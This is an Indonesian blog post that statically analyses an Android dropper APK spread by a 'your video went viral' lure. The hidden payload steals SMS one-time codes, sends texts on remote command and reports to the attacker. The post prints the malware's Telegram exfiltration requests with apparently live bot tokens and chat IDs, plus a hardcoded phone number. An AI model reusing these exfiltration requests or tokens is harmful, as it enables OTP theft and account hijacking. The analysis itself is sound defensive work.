---
title: "Membedah Malicious APK Video Anda Viral Dengan Analisis Statis"
date: 2026-03-14T20:02:06+07:00
comments: true
showtoc: true
tocopen: true
ShowReadingTime: true
---

# Membedah Malicious APK *Video Anda Viral* dengan Analisis Statis

# Intro
Penulis mendapatkan personal chat dari seseorang intinya adalah video saya viral di Tiktok dan disuruh install aplikasi. (tidak masuk akal soalnya penulis tidak memiliki akun Tiktok tiba-tiba viral. Salah sasaran kali ya :D) 
![personal chat dari korban](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/intro-pc.png)

Kemudian, selang beberapa menit teman saya yang ada di grup menginformasikan bahwa waspada jangan sampai memasang aplikasi.  
![informasi dari group](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/intro-group.png)

Dari dua informasi tersebut, penulis tertarik dan mencoba untuk melakukan reverse engineering aplikasi untuk melihat malicious action pada flow aplikasinya.
```
Name: VIDEO ANDA VIRAL.apk
SHA256: 55e7f1057ec571529a73b523505fccfc5044f0b633279ff87c3e71a4a0bbe3e3
Size: 112 M
```

# Metodologi
Analisis dilakukan menggunakan pendekatan kombinasi reverse engineering dengan static analysis menggunakan apktool dan jadx.
Tujuan dari analisis statis ini adalah untuk mengetahui flow aplikasi tanpa menjalankannya secara langsung di emulator atau device.

# Analisis Android Manifest
Android Manifest merupakan file yang mendeskripsikan informasi tentang aplikasi di sistem operasi android dan Google Play (Developers Android, 2026).
Pada AndroidManifest.xml terdapat 3 permissions, yaitu:

1. REQUEST_INSTALL_PACKAGE
2. READ_EXTERNAL_STORAGE
3. WRITE_EXTERNAL_STORAGE

3 permissions sangat berbahaya jika user memasang aplikasi bukan dari sumber resminya, karena berpotensi untuk diambil alih perangkat tanpa sepengetahuan user dengan beberapa skenario seperti mencuri, memodifikasi, dan menghapus informasi.
Kemudian pada section activity didapatkan com.example.droppevqwer123.MainActivity.
![Analisis dari Android Manifest](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/android-manifest.png)

## Analisis Main Activity
Saat dilakukan pengecekan pada com.example.droppevqwer123.MainActivity didapatkan informasi bahwa ada aplikasi lagi yang disimpan dalam bentuk .apk dan dilakukan pemasangan aplikasi kedua di dalam aplikasi pertama. 
![Analisis dari Main activity](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/main-activity.png)

Saat dilakukan pengecekan pada folder assets tidak ada apk namun saat dilakukan show hidden file didapatkan ada file apk tersembunyi 
![Hidden Apk dari directory](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/hidden-apk.png)

Lakukan rename file untuk dilakukan analisis pada aplikasi kedua
![Rename hidden Apk dari directory](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/rename-hidden-apk.png)

# Analisis Android Manifest APK Kedua
Kemudian, saat dilakukan analisis pada AndroidManifest pada apk kedua terlihat bahwa banyak permissions kemungkinan besar ini adalah malicious code. Permission pertama adalah RECEIVE_SMS digunakan untuk menerima pesan masuk, READ_SMS digunakan untuk membaca pesan masuk, SEND_SMS digunakan untuk mengirim pesan ini sangat mencurigakan, INTERNET digunakan untuk komunikasi ke server penyerang sebagai data exfiltration, ACCESS_NETWORK_STATE digunakan untuk akses informasi mengenai jaringan, WAKE_LOCK digunakan untuk service tetap hidup, RECEIVE_BOOT_COMPLETED digunakan untuk persistence, yaitu malicious akan dijalankan setelah dilakukan restart perangkat, dan FOREGROUND_SERVICE digunakan untuk menjalankan service pada background.
![Analisis android manifest apk kedua](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/android-manifest-apk2.png)

Kemudian terdapat deklarasi broadcast receiver. Receiver ini memungkinkan aplikasi untuk menerima intent yang di-broadcast sistem atau aplikasi lain bahkan ketika komponen lain dari aplikasi tidak berjalan (Developer Android, 2026).
![Analisis android manifest apk kedua pada receiver](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/android-manifest-receiver-apk2.png)


## Analisis Main Activity APK Kedua - BroadcastReceiver
Malicious code menggunakan BroadcastReceiver untuk menangkap event. BroadcastReceiver merupakan komponen android digunakan untuk menerima dan mengatur broadcast dari sistem (Developer Android, 2026).
Berdasarkan analisis dari AndroidManifest pada aplikasi kedua, kemungkinan broadcast ini digunakan untuk menangkap notifikasi masuk, seperti pesan masuk untuk mencuri otp code atau sejenisnya.
Pada baris 46 – 49 aplikasi malicious melakukan pengambilan data dari intent, kurang lebih format sebagai berikut:
```
package: com.android.providers.telephony.sms 
title: Bank Mandiri
text: Kode OTP anda adalah 31337404. Kode expired dalam 30 menit. Jangan membagikan kode otp kepada siapapun
```
Lalu pada baris 56 malicious code mengirimkan data mengikuti format pada  baris 46 - 49 melalui http request ke bot Telegram.
```
GET /bot6705766187:AAGbnYoXl_AayvqfxBk65_lNJzN0AMRId4I/sendMessage?parse_mode=markdown&chat_id=6246086208&text=*{stringExtra}*%0A%0A*From :*_{stringExtra2}_%0A*Message :*_{stringExtra3}_ HTTP/1.1
Host: api.telegram.org
```
![Analisis dari Main activity apk kedua](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/main-activity-apk2.png)

Dapat disimpulkan bahwa pada main activity BroadcastReceiver flownya sebagai berikut:

![Flowchart activity broadcast receiver apk kedua](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/flow-main-activity-broadcastreceiver.png#center)

## Analisis Main Activity APK Kedua - RequestPermissions
Kemudian, pada fungsi onRequestPermissionsResult asumsinya adalah user memberikan izin pada notifikasi maka akan mengirimkan http request ke bot Telegram. Code ini mengirimkan device model ke server penyerang. Pada baris 133 malicious code mengirimkan sms ke nomer 082372367121, secara keseluruhan code tersebut akan dikirim melalui server penyerang meskipun kondisi true atau error.

Terdapat non-printable lalu menggunakan tools dari ASCII Validator
![Print non-printed ascii](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/non-printable-identifier.png)

Lalu pada baris 101, 118, dan 135 malicious code mengirimkan data melalui http request ke bot Telegram.
```
GET /bot8319023415:AAGd1muwatmuXhlcL8usnSZyXWMwYs40YM0/sendMessage?parse_mode=markdown&chat_id=5898278521&text=𝐍𝐨𝐭𝐢𝐟𝐢𝐤𝐚𝐬𝐢%20𝐀𝐩𝐥𝐢𝐤𝐚𝐬𝐢%20𝐌𝐮%20𝐃𝐢𝐢𝐧𝐬𝐭𝐚𝐥𝐥%20%0A%20𝐓𝐲𝐩𝐞%20𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭%20:%20DEVICE_ HTTP/1.1
Host: api.telegram.org
```
![Code activity RequestPermissions](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/flow-request-permissions.png)

Dapat disimpulkan bahwa pada main activity RequestPermissions flownya sebagai berikut:
![Flowchart activity RequestPermissions](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/flow-main-activity-requestperm.png#center)

## Analisis Receiver - ReceiveSms
Pada malicious code didapatkan bahwa penyerang menggunakan receiver ini untuk menangkap pesan masuk lalu mengolah sedemikian rupa supaya format tidak terpotong lalu mengumpulkan informasi dari korban, yaitu: ID, USER, PRODUCT, BRAND, BOARD, BOOTLOADER, DISPLAY, HOST, DEVICE, TAGS, FINGERPRINT, TYPE, dan TIME.
Kemudian penyerang melakukan pengiriman melalui http request ke bot Telegram dengan beberapa data saja, seperti MANUFACTUR dan MODEL.
```
GET /bot8319023415:AAGd1muwatmuXhlcL8usnSZyXWMwYs40YM0/sendMessage?parse_mode=markdown&chat_id=5898278521&text=TERIMA SMS BARU %0A %0A𝐏𝐞𝐧𝐠𝐢𝐫𝐢𝐦 :_Pengirim_,%0A𝐏𝐞𝐬𝐚𝐧 :_\n\nPesan%0A %0A𝐓𝐲𝐩𝐞 𝐏𝐞𝐫𝐚𝐧𝐠𝐤𝐚𝐭: BUILD.MANUFACTURER HTTP/1.1
Host: api.telegram.org
receiver-receivesms.png
```
![Code receiver ReceiveSms](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/receiver-receivesms.png)

Dapat disimpulkan bahwa receiver pada ReceiveSms flownya sebagai berikut:

![Flowchart activity receivesms](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/flow-receiver-receivesms.png#center)

## Analisis Receiver - SendSMS
Kode ini adalah pengiriman sms jarak jauh dari penyerang melalui perintah SMS. Pada baris 43 merupakan perintah khusus 55555 dari penyerang untuk melakukan pengiriman sms jarak jauh lalu data dikirim melalui http request ke bot Telegram sebagi log.
```
GET /bot8319023415:AAGd1muwatmuXhlcL8usnSZyXWMwYs40YM0/sendMessage?parse_mode=markdown&chat_id=5898278521&text=Berhasil%20Kirim%20SMS%20dari%20Jauh%20%0AKepada%20:%20_<STR4>_,%0A𝐏𝐞𝐬𝐚𝐧%20:%20_<STR5>_ HTTP/1.1
Host: api.telegram.org
``` 
![Code receiver ReceiveSms](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/receiver-sendsms.png)
Dapat disimpulkan bahwa receiver pada SendSMS flownya sebagai berikut:
![Flowchart activity receivesms](/img/Membedah-Malicious-APK-Video-Anda-Viral-dengan-Analisis-Statis/flow-receiver-sendsms.png#center)

### Bagaimana penyerang bisa impersonate korban? 
Karena penulis curiga bagaimana penyerang bisa impersonate korban ketika chat ke daftar kontak korban adalah dari flow SendSMS ini. mengapa? karena SendSMS ini dipakai penyerang untuk menipu korban dengan melakukan skenario phishing (initial foothold) lalu hijack (unathorized action) WhatsApps. dari hasil analisis keseluruhan ternyata malicious application ini mempunyai kapabilitas selain untuk sms stealer juga digunakan sebagai impersonate korban untuk melakukan penipuan ke teman korban. Terbukti bahwa saat hari itu juga korban membuat klarifikasi di story WhatsApps intinya adalah permohonan maaf karena WhatsApp habis dibajak (tidak ada screenshot karena terlewat)

### Informasi Bot & Nomor 
Setelah dilakukan enumerasi dari Bot didapatkan informasi berikut:
```
- https://api.telegram.org/bot6705766187:AAGbnYoXl_AayvqfxBk65_lNJzN0AMRId4I
{
  "id": 6705766187,
  "is_bot": True,
  "first_name": "BRI TARIF",
  "username": "Bcakskdfkbot",
  "can_join_groups": True,
  "can_read_all_group_messages": False,
  "supports_inline_queries": False,
  "can_connect_to_business": False,
  "has_main_web_app": False,
  "has_topics_enabled": False,
  "allows_users_to_create_topics": False
}

- https://api.telegram.org/bot8319023415:AAGd1muwatmuXhlcL8usnSZyXWMwYs40YM0
{
  "id": 8319023415,
  "is_bot": True,
  "first_name": "Sjaggagagqu",
  "username": "Jajahahgagagagagagv1127bbbot",
  "can_join_groups": True,
  "can_read_all_group_messages": False,
  "supports_inline_queries": False,
  "can_connect_to_business": False,
  "has_main_web_app": False,
  "has_topics_enabled": False,
  "allows_users_to_create_topics": False
}
```

kemudian pada code ada hardcoded nomor 082372367121 setelah dilakukan enumerasi didapatkan informasi sebagai berikut.

Sumber pertama (Telkomsel)
```
0823 -> nomor kartu jenis As
72 -> kode Home Location Register (HLR) daerah Sumatra Tengah
```
Sumber kedua (Gist Github masih fresh yaitu 4 bulan terhitung penulis membuat tulisan ini)
```
0823 -> nomor kartu jenis As
72 -> kode Home Location Register (HLR) daerah Sumatra Selatan
```
Terdapat perbedaan dan hasil dari keduanya dan tidak bisa dibuat acuan. Sebenarnya section ini diluar dari tujuan yang mana sampai menganalisis flownya saja :D 

# Penutup
Malicious application di atas tidak hanya sebagai mencuri otp dari pesan masuk tetapi bisa mengimpersonate korban sehingga bisa dilakukan aktivitas penipuan dari teman korban.
Jangan pernah menginstall sembarangan aplikasi bukan dari sumber resminya, kecuali memang benar-bener mempercayainya.

# Sumber
Developer Android, 2026. App Manifest Overview [online]. Tersedia di: https://developer.android.com/guide/topics/manifest/manifest-intro Diakses 11 Maret 2026

Developer Android, 2026. BroadcastReceiver [online]. Tersedia di: https://developer.android.com/reference/android/content/BroadcastReceiver Diakses 11 Maret 2026 

Developer Android, 2026. <receiver> [online]. Tersedia di: https://developer.android.com/guide/topics/manifest/receiver-element Diakses 11 Maret 2026

Online Tools, 2026. ASCII Validator [online]. Tersedia di: https://onlinetools.com/ascii/validate-ascii Diakses 12 Maret 2026

Telkomsel, 2023. Ketahui Perbedaan Kode Area Telkomsel di Nomor HP, Yuk! [online]. Tersedia di: https://www.telkomsel.com/jelajah/jelajah-lifestyle/ketahui-perbedaan-kode-area-telkomsel-di-nomor-hp-yuk Diakses 13 Maret 2026

Gist, 2026. HLR Telkomsel [online]. Tersedia di: https://gist.github.com/dimasmiftah/1adba1e398761e3d82c92e156ea84344 Diakses 13 Maret 2026